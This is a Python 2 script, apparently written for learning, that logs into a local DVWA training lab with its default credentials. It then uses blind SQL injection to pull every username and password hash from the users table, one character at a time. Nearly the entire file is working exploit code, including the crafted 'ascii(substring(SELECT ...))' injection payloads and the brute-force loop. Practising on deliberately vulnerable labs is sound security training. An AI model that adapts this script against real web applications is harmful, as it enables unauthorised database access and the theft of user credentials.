"""Program created by: ArkAngels
    Member of MilitanIS Team"""

from bs4 import BeautifulSoup
import requests
import time

list_user = []
list_password = []
s = requests.Session()
def dvwa_login():
    url = "http://localhost/DVWA-master/login.php"
    result = s.get(url)
    usertoken = BeautifulSoup(result.text, 'html.parser').find('input', {'name':'user_token'}).get('value')
    payload={"username":"admin",
            "password":"password",
            "Login":"Login",
            "user_token":usertoken
            }
    result = s.post(url, data=payload)
    print "[+]Attempting to connect to DVWA server . . ."
    time.sleep(3)
    print "[+]Successfully connected to DVWA server . . ."
    time.sleep(1)

def find_all_username():
    dvwa_login()
    sqlurl = "http://localhost/DVWA-master/vulnerabilities/sqli_blind/"
    session = requests.Session()
    r = session.get(sqlurl)
    print "[+]Attempting brute force username using Blind SQL Injection on " + sqlurl
    limit = 0
    x = 1
    for i in range(0,100):
        r_username=""
        index = 1
        tries = 1
        comparison = ord('0')
        while True:
            injectid = "1' and ascii(substring((SELECT user from users limit %d,1),%d,1))> %d#" % (limit, index, comparison)
            param = {"id":injectid,
                    "Submit":"Submit"}
            inject = s.get(sqlurl, params=param)
            soup = BeautifulSoup(inject.text, 'html.parser').find('pre').getText()
            if 'exists' in soup:
                tries+=1
                comparison+=1
            elif 'MISSING' in soup:
                if comparison == ord('0'):
                    if len(r_username) == 0:
                        break
                    print "Username %d: %s" % (x, r_username)
                    list_user.append(r_username)
                    x += 1
                    break
                print "[+]Found character number %d is %s" % (index, chr(comparison))
                r_username+=chr(comparison)
                tries = 1
                index += 1
                comparison = ord('0')
        if len(r_username) == 0:
            break
        limit += 1
def find_all_password():
    sqlurl = "http://localhost/DVWA-master/vulnerabilities/sqli_blind/"
    print "[+]Attempting brute force password using Blind SQL Injection on " + sqlurl
    limit = 0
    x = 1
    for i in range(0,100):
        r_password=""
        index = 1
        tries = 1
        comparison = ord('/')
        while True:
            injectid = "1' and ascii(substring((SELECT password from users limit %d,1),%d,1))> %d#" % (limit, index, comparison)
            param = {"id":injectid,
                    "Submit":"Submit"}
            inject = s.get(sqlurl, params=param)
            soup = BeautifulSoup(inject.text, 'html.parser').find('pre').getText()
            if 'exists' in soup:
                tries+=1
                comparison+=1
            elif 'MISSING' in soup:
                if comparison == ord('/'):
                    if len(r_password) == 0:
                        break
                    print "Password for username %d: %s" % (x, r_password)
                    list_password.append(r_password)
                    x += 1
                    break
                print "[+]Found character number %d is %s" % (index, chr(comparison))
                r_password += chr(comparison)
                tries = 1
                index += 1
                comparison = ord('/')
        if len(r_password) == 0:
            break
        limit += 1

find_all_username()
print "[*]Attempting to bruteforce password"
find_all_password()

results = zip(list_user, list_password)
print "These are the list of usernames and password hashes:"
print results
print "Thank you for using my program! Goodluck and happy learning! :)"
